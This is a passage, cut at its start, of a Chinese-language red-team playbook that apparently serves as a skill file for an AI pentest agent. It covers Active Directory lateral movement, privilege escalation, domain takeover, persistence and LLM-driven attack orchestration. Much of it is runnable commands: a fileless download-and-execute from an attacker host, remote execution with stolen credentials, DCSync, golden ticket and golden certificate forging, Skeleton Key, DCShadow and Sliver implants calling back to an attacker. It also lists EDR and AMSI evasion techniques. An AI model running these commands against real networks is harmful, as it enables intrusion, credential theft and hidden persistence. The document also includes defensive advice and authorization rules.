# 内存加载执行（无文件）：IEX (New-Object Net.WebClient).DownloadString('http://attacker/p.ps1')

# 2. WMI（远程执行，无文件）
wmic /node:10.0.0.5 /user:corp.local\user /password:pass process call create "cmd /c calc"

# 3. DCOM（利用 MMC 等 COM 对象）
impacket-dcomexec corp.local/user:pass@10.0.0.5

# 4. 计划任务远程注册
schtasks /create /s 10.0.0.5 /u corp.local\user /p pass /tn back /tr "cmd /c whoami" /sc once /st 00:00
schtasks /run /s 10.0.0.5 /tn back

# 5. 服务远程创建（sc.exe，LOTL）
sc \\10.0.0.5 create back binPath= "cmd /c whoami" 
sc \\10.0.0.5 start back

# 6. SMB 执行（PsExec 协议、impacket-smbexec）
impacket-smbexec corp.local/user:pass@10.0.0.5
```

### 7.3 免杀与内存执行（横向载荷落地时）

```
- Reflective DLL Loading：内存自加载 DLL，绕过 LoadLibrary hook
- APC 注入 / Thread Hijacking：注入合法进程（svchost/explorer）
- 直接系统调用（Direct Syscalls）：绕过用户态 EDR hook
- Sleep 混淆 + PE Header Stomping：规避内存扫描
- 白名单进程链（LOLBIN）：mshta/rundll32/certutil/msiexec/regsvr32 加载
- AMSI/ETW patch：解除 PowerShell 监控（注意版本差异与 EDR 反制）
- 混淆：XOR/AES 载荷 + 运行时解密；字符串拆分防命令行检测
```
> 免杀细节（DLL 注入、syscall、sleep 混淆具体命令）见 `intranet-penetration-testing` 技能"免杀与 C2"章节。

### 7.4 横向移动的 OPSEC 与检测对抗
- **时间差**：横向动作放在业务时段，与批量任务天然混合
- **凭证轮换**：一次横向后更换所用凭据（防中途被截获后反制）
- **双跳隐藏**：A→B→C 双跳执行，避免 B 上出现 C 的直接来源特征
- **最小命令**：远程命令尽量精简（whoami/ipconfig 级），避免在目标上运行重型扫描器
- **利用合法工具**：RMM（AnyDesk/TeamViewer/资产管理系统）被滥用在真实攻击中比例极高——红队可模拟该 TTP 测试检测

## 八、权限提升

### 8.1 Windows 本地提权

```
信息收集：systeminfo / whoami /all / net user / wmic qfe get HotFixID
漏洞利用：WinPEAS / Watson / Windows-Exploit-Suggester
服务滥用：不安全服务权限 / 未引用服务路径（quoted path）
注册表：AlwaysInstallElevated / AutoRun / 弱 DACL
Token 操纵：SeImpersonatePrivilege（Potato 系列：Juicy/PrintSpoofer/GodPotato）
计划任务：高权限计划任务劫持（写入/替换脚本）
凭据提取：SAM / LSA / DPAPI / 浏览器密码 / RDP 缓存
2026 思路：关注每月 Patch Tuesday 新 LPE（提权漏洞时效性极强），
  结合本机补丁列表差集快速命中
```

### 8.2 Linux 提权

```
信息收集：uname -a / id / sudo -l / find / -perm -4000 2>/dev/null
内核漏洞：CVE 利用（DirtyPipe CVE-2022-0847 / PwnKit CVE-2021-4034 / 新内核链）
SUID/SGID：gtfobins.github.io 对照利用
Cron 作业：/etc/crontab / 用户 crontab / /etc/cron.d 可写
Capabilities：getcap -r / 2>/dev/null（cap_setuid 等）
Sudo 滥用：sudo -l → GTFOBins
Docker 组：docker run -v /:/mnt alpine chroot /mnt
环境变量：LD_PRELOAD / LD_LIBRARY_PATH 劫持
容器逃逸：特权容器 → nsenter / CVE 逃逸链
```

### 8.3 域内提权（从标准域用户到域管）
```
路径排序（按性价比）：
1. Kerberoast 破解（离线，无网络动作）
2. BloodHound 找 ACL 滥用 / 委派路径
3. ADCS ESC 利用（见 6.1）
4. 认证胁迫 + NTLM Relay → ADCS/LDAP（见 6.5）
5. GPO 滥用（写 GPO → 下发启动脚本/计划任务 → 域管会话反弹）
6. 明文凭据回收（网络共享脚本、配置文件、运维工具数据库）
```

## 九、域控接管与持久化

### 9.1 DCSync 与票据伪造（域控接管三连）

```bash
# 1. DCSync（需 Replicating Directory Changes 权限——域管/DC 默认具备）
impacket-secretsdump -just-dc-ntlm corp.local/administrator:pass@10.0.0.1
impacket-secretsdump -just-dc-user krbtgt corp.local/administrator:pass@10.0.0.1
# 2. 黄金票据（krbtgt + 域 SID → 伪造任意用户 TGT，有效期默认 10 年）
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain corp.local -aesKey AES administrator
# 3. 白银票据（服务级伪造，更隐蔽）
impacket-ticketer -nthash CIFS_HASH -domain-sid S-1-5-21-xxx -domain corp.local -spn cifs/dc.corp.local user
```
> **替代路径**：拿到 CA 私钥 → 铸造**黄金证书**（Golden Certificate，ADCS 领域"黄金票据"），比 krbtgt 更难被检测；2026 年证书攻击已从"模板漏洞"走向"密钥泄露"层面。

### 9.2 高级持久化（按隐蔽性排序）

| 持久化手段 | 原理 | 隐蔽性 | 检测难度 |
|-----------|------|-------|---------|
| ACL 后门 | 给指定账户写 DCSync/重置密码权限 | 高 | 高（需审计 ACL） |
| 黄金票据 | krbtgt 伪造 | 中 | 中（4769/异常票据） |
| 黄金证书 | CA 私钥铸造证书 | 极高 | 极高 |
| DCShadow | 注册临时 DC 写目录 | 高 | 高 |
| Skeleton Key | 域控 lsass 万能密码 | 中 | 低（lsass 内存检查） |
| AdminSDHolder/SDProp | 特权组保护对象持久化 | 高 | 高 |
| 混合身份后门 | 云端后门 Service Principal / 联邦域 | 高 | 高（云审计） |
| 计划任务/服务 | 常规后门 | 低 | 低 |

```bash
# Skeleton Key（域控内存万能密码，重启失效——短期持久化）
mimikatz # privilege::debug
mimikatz # misc::skeleton
# 任意用户用万能密码 mimikatz 登录
# DCShadow（注册影子 DC，写回目录对象，无需域管在线会话）
mimikatz # lsadump::dcshadow /object:user /attribute:userPassword /value:NewPass
# 黄金证书（Certipy）
certipy ca -ca 'CORP-CA' -backup -u administrator -p pass -dc-ip 10.0.0.1   # 导出 CA 私钥
certipy forge -ca-pfx ca.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'
```

## 十、攻击模拟与自动化

### 10.1 MITRE Caldera（对抗模拟编排）

```bash
# 安装运行（默认 http://localhost:8888，初始 admin/password）
git clone https://github.com/mitre/caldera.git
cd caldera
python3 server.py --fresh
# 界面：创建 agent → 上传/部署 → 跑 Operations（战术链编排）
# Caldera 能力：
# - 内建 Agent（Sandcat/Manx 等）+ C2 配置
# - Operation：把 ATT&CK 技术串成自动执行链（如 "外网打点→横向→提权"）
# - Ability：原子化技术单元（可自定义插件）
# - 与 Atomic Red Team 联动：caldera 插件加载 ART 测试
```

### 10.2 Atomic Red Team（原子测试验证检测）

```powershell
# 安装（Windows）
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
# 执行单个技术（如 Kerberoasting）
Invoke-AtomicTest T1558.003 -ShowDetails
Invoke-AtomicTest T1558.003
# 按战术批量执行（验证 SIEM/EDR 覆盖）
Invoke-AtomicTest T1558 -GetPrereqs; Invoke-AtomicTest T1558
```
> **用途**：红队/紫队确认蓝队检测覆盖率的标准化手段；每个测试对应 ATT&CK 编号，报告可直接引用。

### 10.3 Sliver C2 自动化

```bash
# 生成植入体（跨平台 Go 单文件）
sliver > generate --mtls attacker:8888 --os windows --arch amd64 --save /tmp/implant.exe
sliver > generate --http attacker --os linux --arch amd64
# 多会话管理 + 自动化
sliver > implants
sliver > use <session>
# 内置模块：portscan / pivots（Socks5/TCP 隧道）/ execute-assembly / msf 联动
sliver > generate --mtls attacker:8888 --os windows --skip-symbols --template beacon  # Beacon 模式定时回连
# 编写 sliver 脚本（.sliver 脚本批量执行命令）实现半自动化横向
```

### 10.4 AI 驱动的自动化编排（红队自动化前沿）
- **自主渗透平台**（2025-2026 成熟）：Horizon3.ai NodeZero / Pentera / Picus / Cymulate / XBOW / ARTEMIS——外部攻击面发现 + 漏洞利用验证 + 凭据滥用 + ATT&CK 多阶段链，可在数小时内完成人工数周覆盖（ARTEMIS 实测 8000 主机企业网，成本约 $18/小时）
- **AI 渗透 Agent**：PentestGPT 等 LLM 驱动的"第二大脑"（攻击路径规划、载荷生成、漏洞验证指导、报告生成）
- **编排思路**：侦察 Agent（nmap→指纹→漏洞识别）→ 规划 Agent（LLM 决策下一步）→ 执行 Agent（exp/凭据测试）→ 报告 Agent（汇总证据链）；详见第十一章

## 十一、AI 大模型结合红队作战

### 11.1 AI 辅助攻击路径规划（LLM 分析 BloodHound 数据）

**核心用法**：把 BloodHound 的 JSON 导出/路径结果喂给 LLM，让大模型做"图分析师"：

```text
Prompt 模板（分析 BloodHound 路径）：
"以下是 BloodHound 导出的从 owned 用户 user01 到域管的攻击路径 JSON：
[粘贴路径数据/或粘贴 SharpHound JSON 中 ACL/成员关系摘要]
请：1) 按可行性给路径排序（离线破解>触发认证>ACL 写）；2) 对每条路径给出具体利用步骤与工具命令；3) 标注每条路径的检测面（哪个 Event ID/行为会被蓝队看到）；4) 给出路径上可组合的'链式攻击'建议。"
```

**落地步骤：**
```bash
# 1. 采集（域内主机）
SharpHound.exe -c All --zipfilename data.zip
# 2. 用 bloodhound-python 或 CE 导出路径 JSON
# 3. 本地 LLM（Ollama/vLLM）或云端模型分析：
#    - 汇总 Tier 0 可达路径，输出攻击计划
#    - 生成 Cypher 查询（如"找出所有 GenericWrite on Group 的路径"）
#    - 识别"低检测"路径（避免 Kerberoast 时选择非 RC4 加密等）
# 4. 人工复核 LLM 输出的利用步骤（AI 输出必须验证，防幻觉）
```

### 11.2 AI 驱动自动化打点编排

```
编排框架（Agent 三层）：
┌─ 侦察 Agent：输入资产范围 → 调用 nmap/masscan/fingerprint 子工具 → 汇总资产画像
├─ 规划 Agent（LLM 决策层）：根据资产画像 + 漏洞库 → 输出下一步攻击动作（选 Exploit/凭据测试/路径）
├─ 执行 Agent：调用 exp/poc/凭据测试工具 → 验证结果回传
└─ 报告 Agent：汇总全部动作 → 生成时间线/证据/建议（见 11.3）
```
- **落地形态**：开源实现参考 LeoAI（LangChain4j + 175 个渗透工具 + 24 套预置攻击 Skill，AI Agent 自动规划执行侦察/提权/凭据提取）；商业化参考 10.4 的自主平台
- **OPSEC 注意**：AI 自动执行必须设置**动作白名单与审批点**（爆破、写 ACL、DCSync 等高危动作需人工确认），防止误伤生产
- **经验沉淀**：把本项目所有章节的检查清单转成 Agent 可调用的 Skill/Playbook，实现"技能即编排"

### 11.3 大模型辅助报告生成

```text
Prompt 模板（报告生成）：
"我完成了对 corp.local 的红队测试，以下是攻击链事件记录（按时间顺序）：
[粘贴操作日志/命令记录/输出]
请生成：1) 执行摘要（目标、范围、关键发现 Top5）；2) 攻击链时间线（阶段→动作→TTP 编号→证据）；3) 每个发现的危害评级与修复建议（对照本技能修复章节）；4) 检测建议（具体 Event ID/Sigma 思路）；5) 给管理层的业务影响表述。要求：技术准确、不夸大、标注哪些结论需要人工复核。"
```
- **价值**：把零散的操作日志结构化，显著降低报告编写时间；**但最终报告必须人工复核**——AI 可能幻觉化描述不存在的利用步骤（2026 年 AI 渗透平台报告是合规场景最大的争议点）

### 11.4 AI 分析日志/凭据/攻击面数据
- **凭据语料**：把抓到的哈希/明文交给 LLM 聚类分析（弱口令模式、复用规律、可能的默认口令）
- **流量与日志**：代理流量 pcap 交 LLM 提取认证模式、敏感字段（注意数据不外泄，优先本地模型）
- **泄露情报分析**：Github 泄露仓库批量喂给 LLM 提取"内部域名/IP/账号格式/VPN 配置"，直接指导打点
- **本地部署安全**：若使用本地 LLM，注意其本身也是内网攻击面（Ollama 未授权 API 等），详见 `intranet-penetration-testing` 技能"AI 大模型内网攻击面"章节

### 11.5 AI 结合的边界与风险
- **幻觉防护**：LLM 建议的 exploit/命令必须人工验证后再执行（高影响动作尤其）
- **数据合规**：目标数据尽量在本地模型处理，避免上传第三方 API 造成泄露
- **授权边界**：AI 自动化不改变授权要求——自动化打点同样必须处于 RoE 范围内
- **对抗注意**：红队用 AI 的同时，蓝队/EDR 也在用 AI 检测——AI 生成载荷需注意规避 AI 检测模型

## 十二、红队报告与复盘方法论

### 12.1 报告结构（交付级）

```
1. 执行摘要：目标、范围、时间窗口、关键发现（Tier 0 是否失守）、业务影响
2. 攻击链总览：一页图（时间线 + 关键节点 + 工具）
3. 技术细节：按阶段展开（打点→隧道→内网→AD→域控→持久化），每步含：
   - 操作命令与输出、证据截图
   - 对应 MITRE ATT&CK 编号（T1558.003 等）
   - 影响资产与影响范围
4. 发现清单（按 CVSS/业务影响排序）：漏洞/配置/流程问题，每个含复现步骤+修复建议
5. 修复优先级建议（对照本技能第十五章）
6. 检测建议：具体 Event ID、Sigma/YARA 规则思路、EDR 策略调整
7. 附录：工具清单、时间线明细、授权文件副本引用
```

### 12.2 攻击链复现与证据链管理
- **全程留痕**：操作者侧记录命令日志（时间戳+机器+动作），配合目标侧证据（whoami 输出、注册表、事件日志截图）
- **证据三要素**：能证明"到达"（权限/凭据）、能证明"执行"（命令输出）、能证明"影响"（数据/控制）
- **可复现性**：每个关键发现附"一键复现"步骤，让客户和蓝队能验证修复效果
- **工具与载荷哈希留存**：便于后续事件溯源与误报澄清

### 12.3 复盘与知识沉淀
```
- 攻击路径复盘：实际路径 vs 规划路径的偏差 → 更新决策树（1.2 节）
- 检测对抗复盘：哪些动作触发了哪些告警 → 更新 OPSEC 基线（7.4 节）
- 技术更新复盘：本技能按"最新 CVE/工具版本"滚动更新（ADCS/Certipy/BloodHound 等）
- 输出物：Sigma 检测规则、YARA、EDR 策略建议、红队 Playbook 更新
```

## 十三、工具链

### 13.1 信息收集
```bash
nmap/masscan/RustScan  # 端口扫描（RustScan 速度快）
subfinder/amass        # 子域名枚举
crt.sh/certsh          # 证书透明日志
Shodan/Censys/Fofa     # 互联网测绘
theHarvester/Hunter.io # OSINT
trufflehog/gitdorker   # 泄露扫描
cloud_enum             # 云存储桶枚举
```

### 13.2 渗透与 C2 框架
```bash
Metasploit          # 漏洞利用框架
Cobalt Strike       # 商业 C2（Malleable C2 Profile / BOF / Aggressor）
Sliver              # 开源 Go C2（跨平台植入体，10.3 节）
Havoc               # 开源 C2（免杀友好）
```

### 13.3 AD 渗透与凭据
```bash
impacket            # AD 攻击套件（GetNPUsers/GetUserSPNs/ticketer/psexec/wmiexec/ntlmrelayx/secretsdump/Coercer）
BloodHound CE       # AD 攻击路径图分析（SharpHound/bloodhound-python 采集）
mimikatz/pypykatz   # Windows/Linux 凭据提取
Rubeus              # Kerberos 攻击（kerberoast/asreproast/s4u/dump）
Certipy 5.1.0       # ADCS 全谱攻击（ESC1-16 + 黄金证书 + 证书映射）
Certify              # ADCS 枚举（Windows 端）
Responder/Inveigh   # LLMNR/NBT-NS/mDNS 投毒
mitm6               # IPv6 投毒
crackmapexec/netexec # 内网横向瑞士军刀（前身为 crackmapexec）
evil-winrm          # WinRM 客户端
PowerView/BloodyAD  # ACL 滥用/域枚举
ADFSpoof/shimit/ADFSDump # Golden SAML 攻击
AADInternals        # Azure AD/Entra ID 攻击套件
```

### 13.4 隧道代理
```bash
frp/Chisel/rpivot/ligolo-ng  # TCP/SOCKS 隧道
Neo-reGeorg/Tunna             # WebShell 代理
dnscat2/iodine                # DNS 隧道
ptunnel/icmpsh                # ICMP 隧道
proxychains                   # 代理链
```

### 13.5 提权与自动化
```bash
WinPEAS/LinPEAS     # 信息收集+提权建议
PowerUp             # Windows PowerShell 提权
GTFOBins            # Linux 二进制提权
Caldera             # ATT&CK 对抗模拟编排
Atomic Red Team     # 原子测试（Invoke-AtomicTest）
Watson/Windows-Exploit-Suggester # 补丁差集提权建议
```

## 十四、测试检查清单

### 14.1 规划与打点阶段
- [ ] 明确授权范围/RoE（禁打清单、时间窗口、应急联系人）——未授权绝不测试
- [ ] 目标建模：识别 Tier 0 资产与关键路径决策树
- [ ] 外部资产完整枚举（域名/IP/证书透明日志/云资产）
- [ ] 外网入口测试（Web/VPN/邮件/ADFS/RDWeb/远程桌面）
- [ ] 钓鱼/供应链/云资产入口评估（若在范围内）
- [ ] 打点成功后的"第一滴血"基线（权限/出网/是否入域）

### 14.2 隧道与内网阶段
- [ ] 隧道代理搭建（稳定+隐蔽，参考 3.2）
- [ ] 内网存活/端口/服务收集（分段扫描避免惊动 IDS）
- [ ] 域识别与 AD 枚举（域控/域用户/域组/SPN/信任）
- [ ] BloodHound 采集并完成攻击路径分析（标记 owned 后重算）
- [ ] 关键服务攻击面测试（SMB/LDAP/Kerberos/数据库/Redis/K8s）

### 14.3 AD 渗透与提权阶段
- [ ] Kerberos 攻击（AS-REP Roasting/Kerberoasting）
- [ ] NTLM 攻击（Responder 投毒/SMB Relay/mitm6/认证胁迫）
- [ ] 凭据获取（mimikatz/LSASS 转储/ntds.dit/DPAPI）
- [ ] ADCS 审计（Certipy find -vulnerable，ESC1-16 全覆盖）
- [ ] 委派滥用检查（非约束/约束/RBCD）
- [ ] 信任关系与跨域路径检查
- [ ] 混合身份面检查（Entra Connect/ADFS/PTA/Seamless SSO）
- [ ] 本地提权（Windows/Linux，参考第八章）
- [ ] EDR 环境横向（LOTL/无文件优先，参考第七章）

### 14.4 接管与收尾阶段
- [ ] 域控接管（DCSync → 黄金/白银票据 → 证书伪造）
- [ ] 持久化与后门（ACL 后门/黄金证书/混合身份后门等，选做）
- [ ] 报告素材收集（证据截图/命令日志/时间线）
- [ ] 攻击链可复现性验证（修复后再测基线）
- [ ] 痕迹清理（工具/临时文件/计划任务/服务/内存载荷）
- [ ] 输出检测建议（Event ID/Sigma/YARA）与修复优先级

## 十五、修复与防御建议

### 15.1 外网与打点面
- 收敛暴露面：VPN/OWA/ADFS/RDP 全量收敛到最小化，部署 MFA（含服务账户）
- 补丁管理：VPN/邮件/OA 高危组件 24h 内补丁闭环；关注 2026 年 ADCS 类"配置合规但协议缺陷"的新漏洞形态
- Web 防护：WAF + 组件升级（反序列化类组件升级/迁移，参考 `fastjson-exploitation` 修复章节）
- 钓鱼防护：DMARC/DKIM/SPF 全配、邮件网关过滤仿冒域名、LNK 附件拦截（CVE-2026-32202 类威胁）
- 云资产：桶 ACL 定期审计、云凭证轮换与泄露监控（GitHub 扫描）

### 15.2 隧道与流量
- 出口管控：白名单化出网目标，阻断 DNS/ICMP/QUIC 等异常隧道协议
- 南北向审计：HTTPS 解密（合规前提下）或 TLS 指纹检测，识别 C2
- 域前置/CDN 滥用防护：CDN 配置校验来源域名

### 15.3 AD 与身份层
- **Kerberos**：服务账户密码复杂化+定期轮换、关闭 RC4 加密（Kerberoast 直接失效）、SPN 最小化
- **NTLM**：微软 2026-10 后强制 NTLMv1 阻断，企业应主动逐步禁用 NTLM；SMB 签名全开（消灭 Relay）
- **LLMNR/NBT-NS**：组策略关闭 + 防火墙阻断 UDP 137-138/5355
- **ADCS**：模板 ACL 审计、关闭 ESC6 标志、CA 主机独立管理（EPA/通道绑定）、**及时打补丁（CVE-2026-54121 类协议缺陷）**、证书生命周期与密钥保护
- **委派**：非约束委派全部改约束/RBCD 或直接禁用，委派主机视为 Tier 0
- **混合身份**：Entra Connect 服务器视为 Tier 0；MSOL_ 同步账户最小权限+MFA 保护；ADFS 私钥 HSM 保护；监控 4769/4768 与云侧登录异常
- **Tier Model**：管理员分层（L0/L1/L2），管理员不用普通工作站，杜绝域管会话落低值主机

### 15.4 主机与检测
- EDR 全量覆盖 + 行为规则（LSASS 访问、AMSI、无文件执行、计划任务远程注册）
- Sysmon + 关键 Event ID 告警：4688（进程）、4768/4769（Kerberos 异常）、4624/4625（登录）、4742（计算机账户）、5136（目录修改——DCShadow 检测）
- 监控"合法工具滥用"：sc.exe/schtasks/WMI 远程执行白名单化，RMM 工具入库审计
- 蜜罐/诱饵：域管账户蜜标（触发即告警）、GPO 诱饵

### 15.5 修复验证（红队视角的"再测试"）
- 修复后重跑：Kerberoast 重试（应失败）、Certipy find（应无漏洞）、SMB Relay 重试（签名生效）
- 用 Atomic Red Team 定期验证检测覆盖率（10.2 节）
- 季度性红蓝对抗：用 Caldera 编排全链验证（10.1 节）

## 十六、注意事项与合规声明

- **仅限授权测试**：本技能涉及的所有技术（含爆破、投毒、票据伪造、证书滥用、凭证窃取、后门植入、持久化等）**仅可在获得目标书面授权的环境**（攻防演练、渗透测试项目、靶场/实验环境）中使用。未经授权对任何系统实施探测、利用、凭证提取或持久化行为均属违法（中国《网络安全法》《数据安全法》《刑法》第 285/286 条及各国相关法律），作者与使用者均不承担由此产生的法律责任
- **授权三要素缺一不可**：书面授权文件、明确的测试范围（IP/域名/资产清单）、约定时间窗口与应急止损联系人；RoE 之外的一切行为默认禁止
- **最小影响原则**：优先使用无害 PoC 与 DNSLog/HTTPLog 回连验证漏洞，确认存在后再按需进行受控利用；避免破坏性操作（删库、改配置、DCSync 全量导出、账号锁定）
- **数据保护**：不导出、不传播、不公开任何敏感数据（凭据、邮件、业务数据）；捕获的凭据仅用于授权范围内的路径验证，测试结束后按约定销毁
- **锁定风险**：口令喷洒、爆破必须慢速低并发并配置锁定阈值保护，避免造成真实用户账号锁定影响业务
- **破坏性边界**：DCSync 全量导出、写 ACL、重置密码、域控层面操作（Skeleton Key/DCShadow）等高危动作需事先在 RoE 中明确并经甲方确认
- **痕迹清理**：测试完成后删除所有后门、工具、临时文件、计划任务/服务、内存载荷；涉及云端后门（Service Principal、联邦域）务必在 RoE 允许的持久化验证范围内操作并清理
- **报告义务**：测试结束向甲方提交完整渗透路径、证据链、修复建议与检测建议（参考第十二章），不隐瞒高危发现
- **AI 使用边界**：使用大模型辅助规划/报告时，目标数据优先本地模型处理，避免敏感数据外泄第三方 API；AI 建议的利用步骤必须人工复核（幻觉防护，见 11.5）
- **漏洞情报时效性**：本技能引用的 CVE（如 CVE-2026-54121 Certighost、CVE-2025-33073）与工具版本（Certipy 5.1.0、BloodHound CE v8、Sliver/Caldera 等）具有时效性，实战前务必核对最新补丁状态、工具版本与厂商公告；0day/新公开漏洞利用前务必确认授权与影响范围
- **防御视角转化**：本技能所有攻击手法同时是检测与修复的输入（见第十五章），建议在授权演练中配合蓝队做检测验证（Atomic Red Team/Caldera），实现攻防能力共同提升

## DECISION TREE

```
项目启动 → 授权范围确认（authorized-attack-scope）→ 目标建模与 TTP 映射（第一章）
├── 外网打点 → 资产测绘（联动 attack-surface-recon）→ 暴露面分类 → 路由到细分漏洞 skill
├── Web 漏洞面 → web-attack-methods 分流 → 细分包承接
├── 边界突破 → 内网信息收集（第四章）→ 域环境判定 → AD 基础（第五章）/高级（第六章）递进
├── EDR 存在 → 第七章对抗路径（授权内、最小动作）
├── 域控接管 → 第九章持久化（授权内评估）
├── 大规模复测 → 第十章攻击模拟自动化
└── 收尾 → 第十二章红队复盘方法论 → 报告对齐 pentest-output-standards
```

## TARGET TOOL ADAPTATION

Use visible `http-framework-test` for 外网打点基线、`execute-python-script` for 定向探测与利用脚本、`nuclei` 仅选相关性模板批量验证。C2/隧道平台不假设存在，按第四章以可见工具等价实现。

## RELATED ROUTING

- [attack-surface-recon](../attack-surface-recon/SKILL.md) — 开局侦察与攻击面测绘第一动作
- [redteam-opsec](../redteam-opsec/SKILL.md) — 攻击过程 OPSEC 与痕迹控制
- [web-attack-methods](../web-attack-methods/SKILL.md) — Web 打点阶段的攻击链总览
